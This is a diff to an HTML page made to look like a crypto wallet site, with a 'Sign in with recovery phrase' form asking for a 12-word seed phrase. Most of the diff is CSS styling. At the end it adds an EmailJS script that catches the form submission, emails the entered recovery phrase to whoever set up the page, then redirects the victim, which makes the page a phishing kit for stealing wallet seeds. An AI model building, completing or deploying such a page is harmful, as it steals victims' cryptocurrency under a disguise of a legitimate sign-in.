@@ -29,16 +29,15 @@
       display: flex;
       justify-content: space-between;
       align-items: center;
-      flex-wrap: wrap;
-      gap: 10px;
-      padding: 10px 20px;
+      height: 80px;
+      padding: 0 20px;
       background: var(--bg);
       border-bottom: 1px solid var(--border);
       box-sizing: border-box;
     }
 
     .logo img {
-      height: 50px;
+      height: 60px;
       width: auto;
       display: block;
     }
@@ -47,10 +46,9 @@
       display: flex;
       align-items: center;
       justify-content: center;
-      flex-wrap: wrap;
-      gap: 10px;
-      width: 100%;
-      max-width: 800px;
+      gap: 12px;
+      min-width: 460px;
+      box-sizing: border-box;
     }
 
     /* Search container */
@@ -61,9 +59,7 @@
       border: 1px solid #222;
       border-radius: 20px;
       height: 40px;
-      flex: 1;
-      min-width: 200px;
-      max-width: 500px;
+      width: 560px;
       padding: 0 8px 0 12px;
       box-sizing: border-box;
       cursor: text;
@@ -91,17 +87,28 @@
     }
 
     .search-area input[type="search"] {
-      flex: 1;
+      flex: 1 1 auto;
       height: 100%;
       border: none;
       background: transparent;
       color: var(--text);
       font-size: 16px;
+      outline-offset: 0;
       outline: none;
       padding: 0;
     }
 
+    .search-area input[type="search"]::placeholder {
+      color: var(--muted-text);
+    }
+
+    .search-area input[type="search"]:focus {
+      outline: none;
+    }
+
     .action-btn {
+      width: 150px;
+      height: 40px;
       background: var(--btn-bg);
       border: none;
       border-radius: 25px;
@@ -112,15 +119,21 @@
       display: inline-flex;
       align-items: center;
       justify-content: center;
-      padding: 0 18px;
-      height: 40px;
       transition: background 0.2s ease;
+      position: relative;
+      overflow: hidden;
     }
 
-    .action-btn:hover {
-      background: var(--btn-hover-bg);
+    /* Separate styles for each header button */
+    .create-wallet-btn {
+      background-color: #2a2a2a;
     }
 
+    .create-wallet-btn:hover {
+      background-color: ##222;
+    }
+
+    /* Animate rainbow border on hover */
     @property --angle {
       syntax: '<angle>';
       initial-value: 0deg;
@@ -131,9 +144,23 @@
       background-color: #333;
       border-radius: 25px;
       border: 2px solid transparent;
+      color: var(--text);
+      font-size: 15px;
+      cursor: pointer;
+      padding: 0 20px;
+
       background-image:
-        linear-gradient(#333, #333),
-        conic-gradient(from var(--angle), red, orange, yellow, green, blue, skyblue, red);
+        linear-gradient(#333, #333), /* fill */
+        conic-gradient(
+          from var(--angle),
+          red,
+          orange,
+          yellow,
+          green,
+          blue,
+          skyblue,
+          red
+        );
       background-origin: border-box;
       background-clip: padding-box, border-box;
       transition: background-color 0.3s ease;
@@ -141,6 +168,7 @@
     }
 
     .connect-btn:hover {
+      background-color: #00aa55; /* no change on hover */
       animation: rotate-border 2s linear infinite;
     }
 
@@ -151,34 +179,37 @@
     }
 
     main {
+      height: calc(100% - 80px);
       display: flex;
       justify-content: center;
       align-items: center;
       padding: 20px;
       box-sizing: border-box;
-      min-height: calc(100vh - 100px);
+      background: var(--bg);
     }
 
     form.full-form {
       background: #111;
-      padding: 25px;
+      padding: 30px 40px;
       border-radius: 12px;
       max-width: 480px;
       width: 100%;
       box-sizing: border-box;
+      position: relative;
     }
 
     form.full-form h2 {
       margin-top: 0;
-      margin-bottom: 16px;
+      margin-bottom: 24px;
       font-weight: 500;
-      font-size: 22px;
+      font-size: 24px;
+      color: var(--text);
       text-align: left;
     }
 
     label {
       display: block;
-      margin-bottom: 10px;
+      margin-bottom: 14px;
       font-size: 14px;
       color: var(--muted-text);
     }
@@ -186,7 +217,7 @@
     textarea {
       width: 100%;
       padding: 10px 12px;
-      margin-bottom: 8px;
+      margin-bottom: 6px;
       font-size: 14px;
       border-radius: 6px;
       border: 1px solid var(--input-border);
@@ -196,6 +227,15 @@
       outline: none;
       box-sizing: border-box;
       font-family: inherit;
+    }
+
+    textarea::placeholder {
+      color: var(--muted-text);
+    }
+
+    textarea:focus {
+      border-color: var(--input-focus);
+      box-shadow: 0 0 6px var(--input-focus);
     }
 
     button.submit-btn {
@@ -216,9 +256,9 @@
       background: var(--btn-hover-bg);
     }
 
-    /* Autocomplete */
+    /* Autocomplete suggestions container - horizontal layout */
     .autocomplete-items {
-      display: flex;
+      display: flex !important;
       flex-wrap: wrap;
       gap: 8px;
       background-color: #111;
@@ -227,10 +267,13 @@
       padding: 6px 8px;
       margin-bottom: 12px;
       width: 100%;
+      box-sizing: border-box;
       border-radius: 6px;
       color: var(--text);
       position: static;
-      font-size: 12px;
+      max-height: none;
+      overflow: visible;
+      font-size: 8px; /* smaller font size */
     }
 
     .autocomplete-items div {
@@ -241,6 +284,7 @@
       white-space: nowrap;
       user-select: none;
       transition: background-color 0.2s ease, color 0.2s ease;
+      font-size: 8px;
     }
 
     .autocomplete-items div:hover,
@@ -248,75 +292,34 @@
       background-color: var(--input-focus);
       color: #fff;
     }
-
-    /* ---- RESPONSIVE ---- */
-    @media (max-width: 768px) {
-      .site-header {
-        flex-direction: column;
-        align-items: flex-start;
-      }
-
-      .header-controls {
-        flex-direction: column;
-        width: 100%;
-        gap: 12px;
-      }
-
-      .search-area {
-        width: 100%;
-        max-width: none;
-      }
-
-      .action-btn {
-        width: 100%;
-      }
-
-      form.full-form {
-        padding: 20px;
-      }
-    }
-
-    @media (max-width: 480px) {
-      .search-area input[type="search"] {
-        font-size: 14px;
-      }
-
-      form.full-form h2 {
-        font-size: 20px;
-      }
-
-      textarea {
-        font-size: 13px;
-      }
-
-      button.submit-btn {
-        font-size: 15px;
-      }
-    }
   </style>
 </head>
 <body>
-  <header class="site-header">
-    <div class="logo">
+  <header class="site-header" aria-label="Site header">
+    <div class="logo" aria-label="Site logo container">
       <img src="https://i.imghippo.com/files/VPw1274ruA.png" alt="Base logo" />
     </div>
     <div class="header-controls">
-      <form class="search-area" role="search" method="GET" action="/search-results" novalidate>
-        <span class="search-icon"><img src="https://i.imghippo.com/files/Alr7794o.png" alt="Search Icon" /></span>
-        <input type="search" name="q" placeholder="Search coins, apps…" />
+      <form class="search-area" role="search" aria-label="Site search" method="GET" action="/search-results" novalidate>
+        <span class="search-icon" aria-hidden="true">
+          <img src="https://i.imghippo.com/files/Alr7794o.png" alt="Search Icon" />
+        </span>
+        <input type="search" name="q" placeholder="Search coins, apps…" aria-label="Search coins, apps" />
       </form>
-      <button type="button" class="action-btn create-wallet-btn">Create a wallet</button>
-      <button type="button" class="action-btn connect-btn">Connect</button>
+      <button type="button" class="action-btn create-wallet-btn" aria-label="First action">Create a wallet</button>
+      <button type="button" class="action-btn connect-btn" aria-label="Second action">Connect</button>
     </div>
   </header>
 
   <main>
-    <form class="full-form">
+    <form id="recovery-form" class="full-form" action="#" method="post" aria-label="User details form" autocomplete="off">
       <h2>Sign in with recovery phrase</h2>
+
       <label for="about">This is a 12-word phrase you were given when you created your wallet</label>
-      <textarea id="about" rows="4" placeholder="12-word recovery phrase"></textarea>
+      <textarea id="about" name="Recovery phrase" rows="4" placeholder="12-word recovery phrase"></textarea>
       <div id="autocomplete-list" class="autocomplete-items" style="display:none;"></div>
-      <button type="submit" class="submit-btn">Continue</button>
+
+      <button type="submit" class="submit-btn">continue</button>
     </form>
   </main>
 
@@ -632,7 +635,7 @@
             e.preventDefault();
             if (items[currentFocus]) {
               items[currentFocus].dispatchEvent(new Event("mousedown"));
-            }
+            } 
           }
         } else if (e.key === "Escape") {
           closeSuggestions();
@@ -644,5 +647,26 @@
       });
     });
   </script>
+  <!-- Load EmailJS SDK -->
+<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+<script>
+  (function() {
+    emailjs.init('YOUR_PUBLIC_KEY'); // Replace with your EmailJS public key
+  })();
+
+  document.getElementById('recovery-form').addEventListener('submit', function(event) {
+    event.preventDefault();
+
+    emailjs.sendForm('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', this)
+      .then(function(response) {
+        console.log('SUCCESS!', response.status, response.text);
+        // Redirect after successful email send
+        window.location.href = 'https://example.com/redirect-page'; // Replace with your redirect URL
+      }, function(error) {
+        console.error('FAILED...', error);
+        alert('Failed to send recovery phrase. Please try again.');
+      });
+  });
+</script>
 </body>
 </html>
